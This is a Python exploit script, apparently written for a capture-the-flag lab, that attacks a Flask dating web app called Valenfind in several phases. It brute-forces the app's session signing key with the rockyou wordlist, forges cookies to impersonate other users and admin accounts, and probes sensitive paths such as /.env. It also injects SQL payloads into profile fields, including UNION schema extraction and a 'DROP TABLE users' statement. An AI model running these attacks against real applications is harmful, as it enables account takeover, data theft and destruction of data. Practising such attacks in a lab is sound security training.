#!/usr/bin/env python3
"""Valenfind flag hunter v3 (no parameters).

Key insights from v1/v2:
- SSTI blocked (auto-escaped)
- XSS reflected raw in address/bio but no bot viewing
- Routes found: /dashboard, /logout, /my_profile, /register, /complete_profile
- Session: {"liked":[], "user_id":9, "username":"123"}
- SECRET_KEY not in small wordlist

v3 strategy:
1) Inspect /dashboard thoroughly
2) Crack SECRET_KEY with rockyou.txt
3) Forge cookies for user_id 1-20, check /dashboard + /my_profile for flags
4) SQLi field-by-field with response diffing
5) Dating flow: like users, check matches
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import sys
import time
from typing import Any, Dict, List, Optional, Tuple

import requests

try:
    from flask_unsign import sign as flask_sign, decode as flask_decode
    HAS_FLASK_UNSIGN = True
except ImportError:
    HAS_FLASK_UNSIGN = False

try:
    from itsdangerous import URLSafeTimedSerializer
    HAS_ITS = True
except ImportError:
    HAS_ITS = False


BASE_URL = "http://10.112.165.127:5000"
TIMEOUT = 10
KNOWN_COOKIE = "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw"
KNOWN_DATA = {"liked": [], "user_id": 9, "username": "123"}
ROCKYOU_PATH = os.path.join(os.path.dirname(__file__), "..", "other_vuln", "rockyou.txt")
FLAG_RE = re.compile(r"THM\{[^}]+\}")
ALL_FLAGS: List[str] = []
FOUND_SECRET: Optional[str] = None


def collect_flags(text: str, source: str) -> None:
    for f in FLAG_RE.findall(text):
        if f not in ALL_FLAGS:
            ALL_FLAGS.append(f)
            print(f"[!!!] FLAG FOUND ({source}): {f}")


def sess(cookie: str) -> requests.Session:
    s = requests.Session()
    s.cookies.set("session", cookie)
    return s


def get(s: requests.Session, path: str) -> Tuple[int, str]:
    try:
        r = s.get(f"{BASE_URL}{path}", timeout=TIMEOUT, allow_redirects=True)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def post(s: requests.Session, path: str, data: dict) -> Tuple[int, str]:
    try:
        r = s.post(f"{BASE_URL}{path}", data=data, timeout=TIMEOUT, allow_redirects=True)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def post_json(s: requests.Session, path: str, data: dict) -> Tuple[int, str]:
    try:
        r = s.post(f"{BASE_URL}{path}", json=data, timeout=TIMEOUT, allow_redirects=True)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def clean(html_text: str) -> str:
    t = re.sub(r"<[^>]+>", " ", html_text)
    return re.sub(r"\s+", " ", t).strip()


def extract_links(html_text: str) -> List[str]:
    links = []
    for m in re.finditer(r'(?:href|action|src)\s*=\s*["\']([^"\']+)["\']', html_text, re.I):
        href = m.group(1)
        if href.startswith("/") and href not in links:
            links.append(href)
    return links


def forge_cookie(data: dict, secret: str) -> Optional[str]:
    if HAS_FLASK_UNSIGN:
        try:
            return flask_sign(data, secret=secret)
        except Exception:
            pass
    if HAS_ITS:
        try:
            s = URLSafeTimedSerializer(secret, salt="cookie-session",
                                       signer_kwargs={"key_derivation": "hmac"})
            return s.dumps(data)
        except Exception:
            pass
    return None


# ── Phase 1: Thorough inspection ─────────────────────────────────────────────
def phase1_inspect() -> None:
    print("\n" + "=" * 72)
    print("[Phase 1] Thorough page inspection")
    print("=" * 72)

    s = sess(KNOWN_COOKIE)

    pages = ["/", "/dashboard", "/my_profile", "/complete_profile",
             "/register", "/login", "/logout",
             "/admin", "/flag", "/api", "/api/users",
             "/robots.txt", "/static/", "/static/js/",
             "/static/css/", "/.env", "/config"]

    for path in pages:
        code, text = get(s, path)
        if code == 0 or code == 404:
            continue

        collect_flags(text, f"inspect-{path}")

        # Show page content summary
        c = clean(text)
        links = extract_links(text)

        # HTML comments
        comments = re.findall(r"<!--(.*?)-->", text, re.S)
        interesting_comments = [cm.strip() for cm in comments
                                if any(kw in cm.lower() for kw in ["flag", "thm", "todo", "fix", "secret", "key", "hack", "bug", "vuln", "password", "admin"])]

        # Show results
        has_interest = bool(interesting_comments) or "thm{" in text.lower() or "flag" in text.lower()
        marker = " ***" if has_interest else ""
        print(f"[inspect] {path:<25} -> {code} ({len(text)} bytes) links={len(links)}{marker}")

        if interesting_comments:
            for cm in interesting_comments:
                print(f"  comment: {cm[:200]}")

        if links and path == "/dashboard":
            print(f"  links: {links}")
            # Show dashboard content
            print(f"  content: {c[:500]}")

        if path == "/" or path == "/dashboard":
            # Look for user profile cards, buttons, forms
            forms = re.findall(r"<form[^>]*>(.*?)</form>", text, re.S | re.I)
            buttons = re.findall(r"<button[^>]*>(.*?)</button>", text, re.S | re.I)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', text, re.I)
            if forms:
                print(f"  forms: {len(forms)}")
            if buttons:
                print(f"  buttons: {[clean(b)[:50] for b in buttons[:10]]}")
            if inputs:
                print(f"  inputs: {inputs}")

            # Look for user cards / profile links
            user_links = re.findall(r'href=["\']([^"\']*(?:profile|user|view)[^"\']*)["\']', text, re.I)
            if user_links:
                print(f"  user/profile links: {user_links}")


# ── Phase 2: Crack with rockyou ──────────────────────────────────────────────
def phase2_crack_rockyou() -> Optional[str]:
    global FOUND_SECRET
    print("\n" + "=" * 72)
    print("[Phase 2] Cracking SECRET_KEY with rockyou.txt")
    print("=" * 72)

    if not os.path.exists(ROCKYOU_PATH):
        print(f"[crack] rockyou.txt not found at {ROCKYOU_PATH}")
        # Try alternate paths
        alt = os.path.join(os.path.dirname(__file__), "..", "other_vuln", "rockyou.txt")
        if os.path.exists(alt):
            pass
        else:
            print("[crack] skipping rockyou crack")
            return None

    # Extract signature from cookie to verify against
    parts = KNOWN_COOKIE.split(".")
    cookie_payload = parts[0]  # base64 payload
    cookie_timestamp = parts[1] if len(parts) > 1 else ""
    cookie_sig = parts[2] if len(parts) > 2 else ""

    print(f"[crack] cookie payload: {cookie_payload}")
    print(f"[crack] cookie timestamp: {cookie_timestamp}")
    print(f"[crack] cookie signature: {cookie_sig}")

    count = 0
    t0 = time.time()

    try:
        with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                secret = line.strip()
                if not secret:
                    continue

                count += 1

                if HAS_ITS:
                    try:
                        s = URLSafeTimedSerializer(secret, salt="cookie-session",
                                                   signer_kwargs={"key_derivation": "hmac"})
                        s.loads(KNOWN_COOKIE)
                        print(f"\n[!!!] SECRET_KEY CRACKED: {secret}")
                        print(f"[!!!] tried {count} passwords in {time.time()-t0:.1f}s")
                        FOUND_SECRET = secret
                        return secret
                    except Exception:
                        pass

                if count % 10000 == 0:
                    elapsed = time.time() - t0
                    rate = count / elapsed if elapsed > 0 else 0
                    print(f"[crack] tried {count} ({rate:.0f}/s)...", end="\r")

                # Safety limit: first 100k passwords
                if count >= 100000:
                    print(f"\n[crack] reached {count} limit without finding key")
                    break

    except Exception as e:
        print(f"[crack] error reading wordlist: {e}")

    print(f"\n[crack] exhausted {count} passwords in {time.time()-t0:.1f}s")
    return None


# ── Phase 3: Forge and enumerate ─────────────────────────────────────────────
def phase3_forge(secret: str) -> None:
    print("\n" + "=" * 72)
    print("[Phase 3] Forging cookies and enumerating users")
    print("=" * 72)

    for uid in range(1, 21):
        data = {"liked": [], "user_id": uid, "username": "123"}
        cookie = forge_cookie(data, secret)
        if not cookie:
            print(f"[forge] failed to sign cookie for uid={uid}")
            break

        s = sess(cookie)

        for path in ["/dashboard", "/my_profile", "/", "/admin", "/flag"]:
            code, text = get(s, path)
            if code == 0 or code == 404 or len(text) < 50:
                continue

            collect_flags(text, f"forge-uid{uid}-{path}")

            c = clean(text)
            if "thm{" in text.lower() or "flag" in text.lower():
                print(f"[forge] uid={uid} {path} -> {code} INTERESTING")
                print(f"  content: {c[:300]}")
            elif uid <= 5:
                print(f"[forge] uid={uid} {path} -> {code} ({len(text)} bytes)")

    # Also try admin usernames
    for uname in ["admin", "administrator", "root", "moderator", "mod", "superuser"]:
        for uid in [1, 2, 0]:
            data = {"liked": [], "user_id": uid, "username": uname}
            cookie = forge_cookie(data, secret)
            if not cookie:
                continue

            s = sess(cookie)
            code, text = get(s, "/dashboard")
            collect_flags(text, f"forge-{uname}-uid{uid}")

            c = clean(text)
            if code == 200 and len(text) > 100:
                print(f"[forge] user={uname} uid={uid} /dashboard -> {code} ({len(text)} bytes)")
                if "thm{" in text.lower() or "admin" in c.lower():
                    print(f"  content: {c[:300]}")


# ── Phase 4: SQLi field-by-field ─────────────────────────────────────────────
def phase4_sqli_fields() -> None:
    print("\n" + "=" * 72)
    print("[Phase 4] SQLi field-by-field with response diffing")
    print("=" * 72)

    s = sess(KNOWN_COOKIE)
    _, body = get(s, "/complete_profile")

    fields = []
    for m in re.finditer(r"name\s*=\s*['\"]([^'\"]+)['\"]", body, re.I):
        name = m.group(1)
        if name not in fields and name != "viewport":
            fields.append(name)

    print(f"[sqli] testing fields: {fields}")

    # Get baseline
    baseline_data = {}
    for f in fields:
        fl = f.lower()
        if "mail" in fl:
            baseline_data[f] = "baseline@test.com"
        elif "phone" in fl or "tel" in fl:
            baseline_data[f] = "123456789"
        else:
            baseline_data[f] = "baseline_normal_text"

    post(s, "/complete_profile", baseline_data)
    _, baseline_profile = get(s, "/my_profile")
    baseline_clean = clean(baseline_profile)
    baseline_len = len(baseline_clean)

    sqli = [
        ("' OR '1'='1'--", "boolean"),
        ("' UNION SELECT 1--", "union1"),
        ("' UNION SELECT 1,2,3,4,5--", "union5"),
        ("' UNION SELECT 1,2,3,4,5,6--", "union6"),
        ("' UNION SELECT 1,2,3,4,5,6,7--", "union7"),
        ("' UNION SELECT 1,2,3,4,5,6,7,8--", "union8"),
        ("' UNION SELECT group_concat(name),2,3,4,5 FROM sqlite_master--", "sqlite_tables"),
        ("' UNION SELECT group_concat(sql),2,3,4,5 FROM sqlite_master--", "sqlite_schema"),
        ("' UNION SELECT group_concat(sql),2,3,4,5,6 FROM sqlite_master--", "sqlite_schema6"),
        ("' UNION SELECT group_concat(sql),2,3,4,5,6,7 FROM sqlite_master--", "sqlite_schema7"),
        ("1' OR '1'='1", "or_basic"),
        ("1'; DROP TABLE users;--", "drop"),
    ]

    for field in fields:
        fl = field.lower()
        if any(skip in fl for skip in ["csrf", "token", "submit"]):
            continue

        for payload, tag in sqli:
            test_data = dict(baseline_data)
            test_data[field] = payload

            post(s, "/complete_profile", test_data)
            _, profile = get(s, "/my_profile")
            collect_flags(profile, f"sqli-{field}-{tag}")

            profile_clean = clean(profile)
            diff = len(profile_clean) - baseline_len

            # Check for DB errors or schema leaks
            db_indicators = re.search(
                r"CREATE TABLE|INSERT INTO|sqlite_master|column|error|exception|traceback|syntax",
                profile, re.I
            )

            if db_indicators or abs(diff) > 200:
                print(f"[sqli] {field} / {tag} -> size_diff={diff}, indicator={db_indicators.group(0) if db_indicators else 'size'}")
                print(f"  content: {profile_clean[:400]}")


# ── Phase 5: Dating app interaction ──────────────────────────────────────────
def phase5_dating() -> None:
    print("\n" + "=" * 72)
    print("[Phase 5] Dating app interaction (like/match/chat)")
    print("=" * 72)

    s = sess(KNOWN_COOKIE)

    # Get dashboard to see available profiles
    code, text = get(s, "/dashboard")
    print(f"[dating] /dashboard -> {code} ({len(text)} bytes)")

    # Extract any profile IDs or user references
    user_refs = re.findall(r"user[_-]?id['\"]?\s*[:=]\s*['\"]?(\d+)", text, re.I)
    profile_refs = re.findall(r"profile[_-]?id['\"]?\s*[:=]\s*['\"]?(\d+)", text, re.I)
    data_ids = re.findall(r'data-id=["\'](\d+)["\']', text, re.I)

    all_ids = list(set(user_refs + profile_refs + data_ids))
    print(f"[dating] found IDs in dashboard: {all_ids}")

    # Extract forms from dashboard
    forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>', text, re.S | re.I)
    for action, form_body in forms:
        form_fields = re.findall(r'name=["\']([^"\']+)["\']', form_body, re.I)
        form_values = re.findall(r'value=["\']([^"\']*)["\']', form_body, re.I)
        print(f"[dating] form action={action} fields={form_fields} values={form_values}")

        # Try submitting each form
        data = {}
        for fn in form_fields:
            val_match = re.search(rf'name=["\']{ re.escape(fn) }["\'][^>]*value=["\']([^"\']*)["\']', form_body, re.I)
            if val_match:
                data[fn] = val_match.group(1)
            else:
                data[fn] = "1"

        code2, text2 = post(s, action, data)
        collect_flags(text2, f"dating-form-{action}")
        print(f"[dating] POST {action} -> {code2} ({len(text2)} bytes)")
        c2 = clean(text2)
        if "thm{" in text2.lower() or "match" in text2.lower() or "flag" in text2.lower():
            print(f"  content: {c2[:300]}")

    # Also try liking user IDs directly
    for uid in range(1, 21):
        for ep in ["/like", "/swipe_right", "/swipe", "/match"]:
            for payload in [{"user_id": uid}, {"id": uid}, {"profile_id": uid}, {"target_id": uid}]:
                code, text = post(s, ep, payload)
                if code not in [0, 404, 405]:
                    collect_flags(text, f"dating-{ep}-{uid}")
                    if uid <= 2:
                        print(f"[dating] POST {ep} {payload} -> {code}")

                code, text = post_json(s, ep, payload)
                if code not in [0, 404, 405]:
                    collect_flags(text, f"dating-json-{ep}-{uid}")


def main() -> None:
    print("Valenfind Flag Hunter v3")
    print(f"Target: {BASE_URL}")
    print("=" * 72)

    phase1_inspect()
    secret = phase2_crack_rockyou()
    if secret:
        phase3_forge(secret)
    phase4_sqli_fields()
    phase5_dating()

    print("\n" + "=" * 72)
    print("[FINAL SUMMARY]")
    print("=" * 72)

    if ALL_FLAGS:
        print(f"FLAGS FOUND ({len(ALL_FLAGS)}):")
        for f in ALL_FLAGS:
            print(f"  {f}")
    else:
        print("No flags found yet.")
        print("\nWhat we know:")
        print(f"  - Session: {KNOWN_DATA}")
        print(f"  - SECRET_KEY: {FOUND_SECRET or 'NOT FOUND'}")
        print("  - SSTI: blocked (auto-escaped)")
        print("  - Routes: /dashboard, /my_profile, /complete_profile, /register")
        print("\nNext steps to try manually:")
        print("  - flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt")
        print("  - Check source code of JS files in /static/")
        print("  - Try parameter tampering in query strings")
        print("  - Check for WebSocket or API endpoints")


if __name__ == "__main__":
    main()
